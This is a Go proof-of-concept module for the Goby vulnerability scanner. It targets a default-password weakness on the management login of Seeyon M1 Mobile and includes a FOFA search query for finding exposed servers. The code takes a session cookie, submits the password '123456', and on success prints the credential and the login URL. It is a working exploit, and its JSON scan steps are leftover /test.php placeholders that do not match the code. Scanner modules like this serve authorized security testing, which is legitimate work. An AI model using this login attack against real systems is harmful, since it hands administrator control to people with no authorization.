package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SEEYON-M1-Mobile /index.jsp Default Password Vulnerability",
    "Description": "<p>Zhiyuan M1 Mobile is a mobile app designed for enterprises, designed to improve work efficiency and collaboration. It offers features such as project management, task assignment, document sharing, and instant messaging that can be used across platforms. Users can access and manage enterprise resources anytime and anywhere through their mobile phones or tablets, get real-time work updates, and simplify business processes. </p><p>There is a default password vulnerability on the mobile terminal of Zhiyuan M1, through which an attacker can control the entire platform and use administrator privileges to operate core functions.</p>",
    "Product": "SEEYON-M1-Mobile",
    "Homepage": "https://www.seeyon.com/",
    "DisclosureDate": "2024-08-22",
    "PostTime": "2024-08-22",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "title==\"M1-Server 已启动\" && body=\"M1-Server\"",
    "GobyQuery": "title==\"M1-Server 已启动\" && body=\"M1-Server\"",
    "Level": "1",
    "Impact": "<p>There is a default password vulnerability on the mobile terminal of Zhiyuan M1, through which an attacker can control the entire platform and use administrator privileges to operate core functions.</p>",
    "Recommendation": "<p>1. If not necessary, prohibit public network access to the system. </p><p>2. Set access policies and whitelist access through security devices such as firewalls.</p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Default Password",
        "HW-2024"
    ],
    "VulType": [
        "Default Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.0",
    "Translation": {
        "CN": {
            "Name": "致远互联-M1移动协同办公管理软件 /index.jsp 默认口令漏洞",
            "Product": "致远互联-M1移动端",
            "Description": "<p>致远 M1 移动端是一款专为企业设计的移动应用，旨在提升工作效率和协同能力。它提供了项目管理、任务分配、文档共享和即时通讯等功能，支持跨平台使用。用户可以通过手机或平板随时随地访问和管理企业资源，实时获取工作动态，简化业务流程。<br></p><p>致远 M1 移动端存在默认口令漏洞，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "Recommendation": "<p>1、如非必要，禁止公网访问该系统。&nbsp;</p><p>2、通过防火墙等安全设备设置访问策略，设置白名单访问。<br></p>",
            "Impact": "<p>致远 M1 移动端存在默认口令漏洞，攻击者可通过默认口令漏洞控制整个平台，使用管理员权限操作核心的功能。<br></p>",
            "VulType": [
                "默认口令"
            ],
            "Tags": [
                "默认口令",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "SEEYON-M1-Mobile /index.jsp Default Password Vulnerability",
            "Product": "SEEYON-M1-Mobile",
            "Description": "<p>Zhiyuan M1 Mobile is a mobile app designed for enterprises, designed to improve work efficiency and collaboration. It offers features such as project management, task assignment, document sharing, and instant messaging that can be used across platforms. Users can access and manage enterprise resources anytime and anywhere through their mobile phones or tablets, get real-time work updates, and simplify business processes.&nbsp;</p><p>There is a default password vulnerability on the mobile terminal of Zhiyuan M1, through which an attacker can control the entire platform and use administrator privileges to operate core functions.<br></p>",
            "Recommendation": "<p>1. If not necessary, prohibit public network access to the system.&nbsp;</p><p>2. Set access policies and whitelist access through security devices such as firewalls.<br></p>",
            "Impact": "<p>There is a default password vulnerability on the mobile terminal of Zhiyuan M1, through which an attacker can control the entire platform and use administrator privileges to operate core functions.<br></p>",
            "VulType": [
                "Default Password"
            ],
            "Tags": [
                "Default Password",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9942"
}`
	sendPayloadaschabchkacbaknxsabxsu := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		vulInfo := ``
		vulPath := `/management/index.jsp`
		requestGetConfig := httpclient.NewGetRequestConfig("/management/index.jsp")
		requestGetConfig.VerifyTls = false
		requestGetConfig.FollowRedirect = false
		resp, err := httpclient.DoHttpRequest(hostInfo, requestGetConfig)
		if err != nil {
			return false, vulInfo, vulPath
		}
		header := resp.HeaderString.String()
		if !strings.Contains(header, "JSESSIONID=") || resp.StatusCode != 200 {
			return false, vulInfo, vulPath
		}
		jessionid := strings.Split(strings.Split(header, "JSESSIONID=")[1], ";")[0]
		requestConfig := httpclient.NewPostRequestConfig("/management/index.jsp")
		requestConfig.VerifyTls = false
		requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
		requestConfig.FollowRedirect = false
		requestConfig.Data = "password=123456"
		requestConfig.Header.Store("Cookie", "JSESSIONID="+jessionid)
		resp, err = httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 302 {
			return false, vulInfo, vulPath
		}
		vulInfo = `123456`
		return true, vulInfo, vulPath
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadaschabchkacbaknxsabxsu(hostInfo)
			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + "@" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			_, vulInfo, _ := sendPayloadaschabchkacbaknxsabxsu(expResult.HostInfo)
			expResult.Output = `Please use "` + vulInfo + `" to login ` + expResult.HostInfo.FixedHostInfo + `/management/index.jsp`
			expResult.Success = true
			return expResult
		},
	))
}
